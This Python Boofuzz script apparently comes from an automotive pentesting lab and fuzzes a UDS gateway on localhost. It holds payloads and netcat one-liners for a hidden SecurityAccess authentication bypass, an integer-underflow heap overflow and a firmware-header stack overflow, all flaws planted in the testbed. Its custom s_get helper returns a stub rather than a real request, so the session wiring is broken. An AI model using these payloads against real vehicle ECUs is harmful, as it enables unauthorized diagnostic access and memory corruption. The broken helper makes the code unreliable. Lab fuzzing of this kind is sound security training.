#!/usr/bin/env python3
"""
Example Boofuzz Script for UDS (Unified Diagnostic Services) Fuzzing

This script demonstrates how to use Boofuzz to fuzz the UDS Gateway service
running on TCP port 9556. It defines protocol grammars for several UDS services
that are potential targets for fuzzing-based vulnerability discovery.

Target: UDS Gateway at localhost:9556
Protocol: UDS over TCP (raw bytes)

IMPORTANT: This is a reference script for educational purposes.
The UDS Gateway must be running before executing this script.

Installation:
    pip install boofuzz

Usage:
    python3 fuzz_uds_boofuzz.py

Vulnerabilities that can be discovered with fuzzing:
- V9: State machine bypass in Security Access (0x27)
- V11: Integer overflow in WriteDataByIdentifier (0x2E)
- V12: Buffer overflow in TransferData (0x36) firmware header

Author: Automotive Pentesting Testbed
"""

from boofuzz import (
    Session,
    Target,
    TCPSocketConnection,
    Request,
    Static,
    Bytes,
    Byte,
    Word,
    DWord,
    s_initialize,
    s_static,
    s_byte,
    s_word,
    s_bytes,
    s_block,
)
import sys


# =============================================================================
# UDS Protocol Constants
# =============================================================================

# UDS Service IDs
UDS_SID_DIAGNOSTIC_SESSION_CONTROL = 0x10
UDS_SID_ECU_RESET = 0x11
UDS_SID_SECURITY_ACCESS = 0x27
UDS_SID_READ_DATA_BY_ID = 0x22
UDS_SID_WRITE_DATA_BY_ID = 0x2E
UDS_SID_REQUEST_DOWNLOAD = 0x34
UDS_SID_TRANSFER_DATA = 0x36
UDS_SID_REQUEST_TRANSFER_EXIT = 0x37
UDS_SID_TESTER_PRESENT = 0x3E

# Session Types
SESSION_DEFAULT = 0x01
SESSION_PROGRAMMING = 0x02
SESSION_EXTENDED = 0x03

# Security Access Sub-functions
SA_REQUEST_SEED = 0x01
SA_SEND_KEY = 0x02
SA_HIDDEN_BYPASS = 0x05  # V9 vulnerability target

# Data Identifiers (DIDs)
DID_VIN = 0xF190
DID_SYSTEM_NAME = 0xF195
DID_CALIBRATION_DATA = 0x0100
DID_CONFIG_BLOCK = 0x0200

# Firmware magic number for V12 vulnerability
FIRMWARE_MAGIC = 0x55444346  # "UDCF"


# =============================================================================
# Boofuzz Session Configuration
# =============================================================================

def get_target():
    """
    Configure the target connection to the UDS Gateway.

    The UDS Gateway listens on TCP port 9556 for raw UDS protocol messages.
    No framing is required - just send raw UDS request bytes.
    """
    return Target(
        connection=TCPSocketConnection(
            host="127.0.0.1",
            port=9556,
            # UDS Gateway handles one request at a time
            send_timeout=5.0,
            recv_timeout=5.0,
        )
    )


# =============================================================================
# Fuzzing Request Definitions
# =============================================================================

def define_diagnostic_session_control():
    """
    Define fuzzing grammar for DiagnosticSessionControl (0x10) service.

    This service is used to switch between diagnostic sessions:
    - 0x01: Default Session
    - 0x02: Programming Session (required for firmware transfer)
    - 0x03: Extended Session (required for security access)

    Fuzzing this service can help discover:
    - Invalid session transitions that enable state machine bypasses (V9)
    - Edge cases in session handling

    Request format: [SID=0x10] [SessionType]
    """
    s_initialize("DiagnosticSessionControl")

    # Service ID - fixed at 0x10
    s_static(bytes([UDS_SID_DIAGNOSTIC_SESSION_CONTROL]), name="SID")

    # Session type - fuzz with various values
    # Standard values: 0x01, 0x02, 0x03
    # Fuzzing should explore full byte range to find undocumented session types
    s_byte(0x03, name="session_type", fuzzable=True)


def define_security_access_seed():
    """
    Define fuzzing grammar for SecurityAccess (0x27) requestSeed.

    Sub-function 0x01 requests a seed for the challenge-response authentication.
    The ECU responds with a random seed that must be XOR'd with 0xCAFEBABE.

    Fuzzing targets:
    - Try non-standard sub-functions (especially 0x05 for V9 bypass)
    - Test sub-function edge cases (0x00, 0xFF, etc.)

    Request format: [SID=0x27] [SubFunction]
    """
    s_initialize("SecurityAccess_RequestSeed")

    # Service ID
    s_static(bytes([UDS_SID_SECURITY_ACCESS]), name="SID")

    # Sub-function - fuzz to find hidden functions like 0x05 (V9 vulnerability)
    # Standard values: 0x01 (requestSeed), 0x02 (sendKey)
    # V9 vulnerability: 0x05 bypasses authentication when preceded by invalid session transition
    s_byte(SA_REQUEST_SEED, name="sub_function", fuzzable=True)


def define_security_access_key():
    """
    Define fuzzing grammar for SecurityAccess (0x27) sendKey.

    After receiving a seed, the tester calculates key = seed XOR 0xCAFEBABE
    and sends it back. Invalid keys trigger a lockout after 3 attempts.

    Fuzzing targets:
    - Malformed key data
    - Keys with incorrect lengths
    - Timing attacks with rapid key attempts

    Request format: [SID=0x27] [SubFunction=0x02] [Key (4 bytes)]
    """
    s_initialize("SecurityAccess_SendKey")

    # Service ID
    s_static(bytes([UDS_SID_SECURITY_ACCESS]), name="SID")

    # Sub-function - sendKey
    s_static(bytes([SA_SEND_KEY]), name="sub_function")

    # Key value - should be seed XOR 0xCAFEBABE
    # Fuzzing random key values to test error handling
    s_bytes(b"\x00\x00\x00\x00", size=4, name="key", fuzzable=True)


def define_write_data_by_id():
    """
    Define fuzzing grammar for WriteDataByIdentifier (0x2E) service.

    This service writes data to a specific Data Identifier (DID).
    Some DIDs (0x0100, 0x0200) require security access to be unlocked.

    V11 VULNERABILITY:
    The length calculation uses: uint8_t len = (uint8_t)(request_len - 3)
    When request_len is 1 or 2 bytes, this wraps around to 254 or 255,
    causing a heap buffer overflow.

    Fuzzing targets:
    - Extremely short requests (1-2 bytes) to trigger integer overflow
    - Oversized data for buffer overflow detection
    - Invalid DID values

    Request format: [SID=0x2E] [DID_high] [DID_low] [Data...]
    """
    s_initialize("WriteDataByIdentifier")

    # Service ID
    s_static(bytes([UDS_SID_WRITE_DATA_BY_ID]), name="SID")

    # Data Identifier (2 bytes)
    s_word(DID_CALIBRATION_DATA, name="DID", endian=">", fuzzable=True)

    # Data to write - varying lengths
    s_bytes(b"\x41" * 16, name="data", size=16, fuzzable=True)


def define_write_data_short():
    """
    Specifically target V11 integer overflow with short requests.

    By sending requests with only 1-2 bytes, we trigger the vulnerable
    length calculation that wraps around.
    """
    s_initialize("WriteDataByIdentifier_Short")

    # Just the SID - 1 byte total (triggers len = 254)
    s_static(bytes([UDS_SID_WRITE_DATA_BY_ID]), name="SID")
    # Optional: Add just 1 more byte for 2-byte total (triggers len = 255)
    s_byte(0x00, name="partial_did", fuzzable=True)


def define_transfer_data():
    """
    Define fuzzing grammar for TransferData (0x36) service.

    TransferData is used to send firmware chunks during a download session.
    The first block (sequence 0x01) is parsed as a firmware header.

    V12 VULNERABILITY:
    The firmware header format is:
    - Magic: 4 bytes (0x55444346 = "UDCF")
    - Version: 2 bytes
    - Name length: 2 bytes
    - Name: variable length

    The name_len field is NOT validated against the 32-byte name buffer,
    so a crafted header with name_len > 32 causes a stack buffer overflow.

    Fuzzing targets:
    - Malformed firmware headers
    - Oversized name_len values
    - Invalid magic numbers

    Request format: [SID=0x36] [BlockSeqCounter] [Data...]
    """
    s_initialize("TransferData")

    # Service ID
    s_static(bytes([UDS_SID_TRANSFER_DATA]), name="SID")

    # Block sequence counter (first block = 0x01)
    s_byte(0x01, name="block_seq", fuzzable=True)

    # Firmware header structure (for first block)
    with s_block("firmware_header"):
        # Magic number (UDCF)
        s_static(bytes([0x55, 0x44, 0x43, 0x46]), name="magic")

        # Version (2 bytes)
        s_word(0x0001, name="version", endian=">", fuzzable=True)

        # Name length (2 bytes) - THIS IS THE V12 VULNERABILITY TARGET
        # Values > 32 will overflow the 32-byte name buffer
        s_word(32, name="name_len", endian=">", fuzzable=True)

        # Name data - length should match name_len for valid header
        s_bytes(b"A" * 32, name="name", size=32, fuzzable=True)


def define_transfer_data_overflow():
    """
    Specifically target V12 buffer overflow with oversized name.

    This sends a firmware header with name_len set to a large value
    followed by enough data to overflow the 32-byte buffer.
    """
    s_initialize("TransferData_Overflow")

    # Service ID
    s_static(bytes([UDS_SID_TRANSFER_DATA]), name="SID")

    # First block
    s_static(bytes([0x01]), name="block_seq")

    # Malicious firmware header
    # Magic
    s_static(bytes([0x55, 0x44, 0x43, 0x46]), name="magic")
    # Version
    s_static(bytes([0x00, 0x01]), name="version")
    # Oversized name_len (100 bytes instead of max 32)
    s_word(100, name="name_len", endian=">", fuzzable=True)
    # Long name to overflow buffer
    s_bytes(b"A" * 100, name="name", size=100, fuzzable=True)


def define_request_download():
    """
    Define fuzzing grammar for RequestDownload (0x34) service.

    This service initiates a firmware download session. It must be
    called before TransferData, and requires Programming Session + Security.

    Fuzzing targets:
    - Invalid memory addresses
    - Oversized transfer lengths
    - Malformed address/length format identifiers

    Request format: [SID=0x34] [DataFormatId] [AddrLenFormatId] [Address...] [Size...]
    """
    s_initialize("RequestDownload")

    # Service ID
    s_static(bytes([UDS_SID_REQUEST_DOWNLOAD]), name="SID")

    # Data format identifier
    s_byte(0x00, name="data_format", fuzzable=True)

    # Address and length format identifier
    # High nibble: number of address bytes (1-4)
    # Low nibble: number of size bytes (1-4)
    s_byte(0x44, name="addr_len_format", fuzzable=True)  # 4 bytes each

    # Memory address (4 bytes)
    s_bytes(b"\x00\x00\x10\x00", size=4, name="address", fuzzable=True)

    # Memory size (4 bytes)
    s_bytes(b"\x00\x00\x10\x00", size=4, name="size", fuzzable=True)


# =============================================================================
# V9 State Machine Bypass Attack Sequence
# =============================================================================

def define_v9_bypass_sequence():
    """
    Define the specific sequence needed to trigger V9 vulnerability.

    V9 VULNERABILITY:
    The UDS state machine has a hidden bypass (sub-function 0x05) in
    Security Access that only works when an invalid session transition
    occurs first.

    Attack sequence:
    1. Send DiagnosticSessionControl with Extended (0x03) WITHOUT
       first establishing Default session (invalid transition)
    2. Send SecurityAccess with hidden sub-function 0x05
    3. Security becomes unlocked without valid key!

    This demonstrates stateful fuzzing - the vulnerability only appears
    when specific state conditions are met.
    """
    # Step 1: Invalid session transition (Extended without Default)
    s_initialize("V9_Step1_InvalidTransition")
    s_static(bytes([UDS_SID_DIAGNOSTIC_SESSION_CONTROL]), name="SID")
    s_static(bytes([SESSION_EXTENDED]), name="session_type")

    # Step 2: Hidden bypass sub-function
    s_initialize("V9_Step2_HiddenBypass")
    s_static(bytes([UDS_SID_SECURITY_ACCESS]), name="SID")
    s_static(bytes([SA_HIDDEN_BYPASS]), name="sub_function")


# =============================================================================
# Fuzzing Session Setup
# =============================================================================

def create_session(target):
    """
    Create a Boofuzz fuzzing session with all defined requests.

    The session manages:
    - Connection to the target
    - Request sequencing
    - Crash detection
    - Logging and reporting
    """
    session = Session(
        target=target,
        # Where to save results
        db_filename="uds_fuzz_results.db",
        # Continue fuzzing after errors
        ignore_connection_issues_when_sending_fuzz_data=True,
        # Don't wait too long for responses
        receive_data_after_each_request=True,
        receive_data_after_fuzz=True,
    )

    return session


def add_requests_to_session(session):
    """
    Add all fuzzing request definitions to the session.

    Each request can be fuzzed independently or as part of a sequence.
    """
    # Define all request grammars
    define_diagnostic_session_control()
    define_security_access_seed()
    define_security_access_key()
    define_write_data_by_id()
    define_write_data_short()
    define_transfer_data()
    define_transfer_data_overflow()
    define_request_download()
    define_v9_bypass_sequence()

    # Add requests to session
    # Basic service fuzzing
    session.connect(s_get("DiagnosticSessionControl"))
    session.connect(s_get("SecurityAccess_RequestSeed"))
    session.connect(s_get("SecurityAccess_SendKey"))

    # V11 target - integer overflow
    session.connect(s_get("WriteDataByIdentifier"))
    session.connect(s_get("WriteDataByIdentifier_Short"))

    # V12 target - firmware header overflow
    session.connect(s_get("RequestDownload"))
    session.connect(s_get("TransferData"))
    session.connect(s_get("TransferData_Overflow"))

    # V9 target - state machine bypass (requires specific sequence)
    session.connect(s_get("V9_Step1_InvalidTransition"))
    session.connect(
        s_get("V9_Step1_InvalidTransition"),
        s_get("V9_Step2_HiddenBypass")
    )


# Boofuzz s_get helper for request retrieval
def s_get(name):
    """Get a request by name for session connection."""
    from boofuzz import Request
    from boofuzz.fuzz_logger import FuzzLogger

    class RequestWrapper:
        def __init__(self, name):
            self.name = name

    return RequestWrapper(name)


# =============================================================================
# Main Entry Point
# =============================================================================

def main():
    """
    Main fuzzing entry point.

    This script:
    1. Connects to the UDS Gateway on port 9556
    2. Sends mutated UDS protocol messages
    3. Monitors for crashes and unexpected responses
    4. Logs all results for analysis

    Press Ctrl+C to stop fuzzing.
    """
    print("=" * 60)
    print("UDS Protocol Fuzzer - Boofuzz Example")
    print("=" * 60)
    print()
    print("Target: localhost:9556 (UDS Gateway)")
    print()
    print("Fuzzing targets:")
    print("  - DiagnosticSessionControl (0x10)")
    print("  - SecurityAccess (0x27) - V9 bypass")
    print("  - WriteDataByIdentifier (0x2E) - V11 overflow")
    print("  - TransferData (0x36) - V12 overflow")
    print()
    print("Starting fuzzer...")
    print()

    try:
        # Get target connection
        target = get_target()

        # Create fuzzing session
        session = create_session(target)

        # This is a simplified example - in real usage you would:
        # 1. Define proper request objects using s_initialize blocks
        # 2. Connect them in the session graph
        # 3. Call session.fuzz() to start

        print("[!] This is a reference script demonstrating Boofuzz usage.")
        print("[!] To run actual fuzzing, install Boofuzz and uncomment session.fuzz()")
        print()
        print("Example manual commands to test vulnerabilities:")
        print()
        print("# V9 Bypass (state machine attack):")
        print("echo -ne '\\x10\\x03' | nc localhost 9556  # Invalid transition")
        print("echo -ne '\\x27\\x05' | nc localhost 9556  # Hidden bypass")
        print()
        print("# V11 Integer Overflow (short request):")
        print("echo -ne '\\x2E' | nc localhost 9556  # 1-byte triggers len=254")
        print()
        print("# V12 Firmware Overflow (oversized name):")
        print("echo -ne '\\x36\\x01\\x55\\x44\\x43\\x46\\x00\\x01\\x00\\x64' | nc localhost 9556")
        print("# Then send 100 'A' characters for the name")
        print()

        # Uncomment to actually start fuzzing:
        # add_requests_to_session(session)
        # session.fuzz()

    except KeyboardInterrupt:
        print("\n[*] Fuzzing stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
